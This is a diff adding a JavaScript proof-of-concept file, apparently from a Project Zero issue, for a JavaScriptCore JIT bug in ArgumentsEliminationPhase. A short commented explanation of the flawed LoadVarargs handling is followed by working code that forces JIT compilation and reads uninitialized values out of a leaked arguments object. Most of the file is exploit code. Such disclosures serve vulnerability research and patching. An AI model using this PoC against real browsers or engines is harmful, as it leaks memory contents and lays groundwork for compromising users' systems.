@@ -1,0 +1,68 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1262
+
+Here is a snippet of ArgumentsEliminationPhase::transform
+    case LoadVarargs:
+        ...
+        if (candidate->op() == PhantomNewArrayWithSpread || candidate->op() == PhantomSpread) {
+            ...
+            if (argumentCountIncludingThis <= varargsData->limit) {
+                storeArgumentCountIncludingThis(argumentCountIncludingThis);
+                // store arguments
+                ...
+            }
+
+            node->remove();
+            node->origin.exitOK = canExit;
+            break;
+        }
+
+Whether or not the "argumentCountIncludingThis <= varargsData->limit" condition is satisfied, it removes the |node| variable and exits the switch statement. So in this case the condition is not satisfied, the arguments object created by the following code(CreateDirectArguments in the PoC) may have uninitialized values and length.
+
+PoC:
+-->
+
+const kArgsLength = 0x101;
+
+let buggy = null;
+function inlineFunc() {
+    if (arguments.length != kArgsLength) {
+        buggy = arguments;
+    }
+}
+
+class ClassForInine extends inlineFunc {
+}
+
+function sleep(ms) {
+    let start = new Date();
+    while (new Date() - start < ms);
+}
+
+function main() {
+    let args = new Array(kArgsLength);
+    args.fill(333 + 1);
+    args = args.join(', ');
+
+    let opt = new Function(`(() => {
+        new ClassForInine(${args});
+    })();`);
+
+    for (let i = 0; i < 0x100000; i++) {
+        opt();
+
+        if (i === 0x3000)
+            sleep(1000);
+
+        if (buggy) {
+            print('buggy.length: ' + buggy.length);
+            break;
+        }
+    }
+
+    for (let i = 0, n = buggy.length; i < n; i++) {
+        print(buggy[i]);
+    }
+}
+
+main();
